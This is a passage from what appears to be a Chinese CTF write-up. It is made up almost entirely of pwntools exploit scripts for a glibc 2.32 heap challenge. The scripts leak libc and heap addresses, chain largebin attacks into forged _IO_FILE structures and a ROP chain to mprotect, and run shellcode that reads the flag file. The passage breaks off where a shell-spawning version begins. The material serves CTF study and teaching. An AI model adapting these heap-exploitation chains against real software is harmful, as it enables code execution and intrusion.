class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>,payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Trigger Kiwi --&gt; Husk --&gt; Pig                       |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>另附 shellcode 版本（避免阴间出题人沙盒拉满，<strong>侧信道，架构反复横跳</strong>，或者<strong>把 flag 藏起来</strong>）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.32/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./des_heap&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25296</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>    sleep(<span class="hljs-number">0.03</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">offset,data,size=<span class="hljs-number">0x1000</span>-<span class="hljs-number">1</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(offset))<br>    sla(<span class="hljs-string">&#x27;content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    menu(<span class="hljs-number">4</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                               Init Heap                               |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>add(<span class="hljs-number">0x100</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                 0x100*8 ---&gt; Full Tcache ,Leak libc                   |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br>edit(<span class="hljs-number">0</span>,chunk)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span> + (<span class="hljs-number">7</span>-i)*<span class="hljs-number">0x100</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0xf8</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># Bypass \x00 Leak libc</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>) <br>show()<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>rax = libc_base + <span class="hljs-number">0x0000000000044c70</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000006105a</span><br>ret = libc_base + <span class="hljs-number">0x0000000000028a55</span> + <span class="hljs-number">1</span><br>read_addr = libc.sym.read<br>write_addr = libc.sym.write<br>__malloc_hook = libc.sym.__malloc_hook<br>__free_hook = libc.sym.__free_hook<br>system_addr = libc.sym.system<br>jmp_rsi = libc_base + <span class="hljs-number">0x00000000000756fd</span><br><span class="hljs-comment"># 0x00000000000756fd: mov r13d, 1; jmp rsi;</span><br><span class="hljs-comment"># bin_sh%1 == 1</span><br><span class="hljs-comment"># bin_sh = libc.search(&#x27;/bin/sh&#x27;).next() </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Husk</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>__printf_function_table = libc_base + <span class="hljs-number">0x1e35c8</span><br>__printf_arginfo_table = libc_base + <span class="hljs-number">0x1eb218</span><br>exit = libc.sym.exit<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Pig</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>_IO_list_all = libc_base + <span class="hljs-number">0x1e15c0</span><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x1e2560</span><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Kiwi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>top_chunk = libc_base + <span class="hljs-number">0x1e0c00</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                        Leak Heap,Recover Heap                         |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>,<span class="hljs-number">0x11</span>) <br>add(<span class="hljs-number">0x58</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>show()<br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">4</span>))<br>heap_base = heap_leak &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment"># 0xa0 + 0x60 = 0x100 Recover Heap</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Largebin Attack Preparing.....                      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">&#x27;\0&#x27;</span> * <span class="hljs-number">0x420</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x421</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x410</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(chunk))<br>edit(<span class="hljs-number">0x1000</span>,chunk)<br><br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Largebin</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|   Largebin Attack __printf_function_table&amp;__printf_arginfo_table      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Unsorted</span><br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_function_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_function_table)<br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_arginfo_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_arginfo_table)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x388</span> + <span class="hljs-number">0x20</span>,p64(exit))<span class="hljs-comment"># Exit</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                      Largebin Attack _IO_list_all                     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(_IO_list_all - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Largebin Attack main_arena&#x27;s topchunk,Kiwi Preparing.....      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(top_chunk - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Tcache Poisoning,Make up _IO_FILE chain,Pig Preparing.....     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>edit(<span class="hljs-number">0x110</span>,p64(heap_leak^(__malloc_hook)),<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>,p64(magic) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br><br>fuck = SigreturnFrame()<br>fuck.rsp = heap_base + <span class="hljs-number">0xD10</span><br>fuck.rip = ret<br><br>mmp = flat([<br>    rdi,((heap_base + <span class="hljs-number">0xD00</span>)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span>,rsi,<span class="hljs-number">0x2000</span>,rdx_r12,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,libc.sym.mprotect,rdi,<span class="hljs-number">0</span>,rsi,heap_base + <span class="hljs-number">0xD00</span>,rdx_r12,<span class="hljs-number">0x1000</span>,<span class="hljs-number">0</span>,read_addr,jmp_rsi<br>])<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xA00</span> ,fuck,<span class="hljs-number">0x300</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xD10</span>,mmp,<span class="hljs-number">0x100</span>)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span>,payload)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>,payload)<br><br><span class="hljs-comment"># ORW                             # rdx</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(heap_base + <span class="hljs-number">0xA00</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>,payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Trigger Kiwi --&gt; Husk --&gt; Pig                       |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x1000</span>)<br><span class="hljs-comment"># sl(asm(shellcraft.open(&quot;./&quot;,0x10000) + shellcraft.getdents(&quot;rax&quot;,&quot;rsp&quot;,0x200) + shellcraft.write(1,&quot;rsp&quot;,0x200)))</span><br><span class="hljs-comment"># data0=p.recv(0x200)</span><br><span class="hljs-comment"># print(dirents(data0))</span><br>sl(asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>,<span class="hljs-number">0</span>)+shellcraft.read(<span class="hljs-string">&quot;rax&quot;</span>,<span class="hljs-string">&quot;rsp&quot;</span>,<span class="hljs-number">0x100</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;rsp&quot;</span>,<span class="hljs-number">0x100</span>)))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>没开沙箱的直接拿 shell 版本，这里有点像 2.24~2.27 那里的 _IO_str_overlow 的利用方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 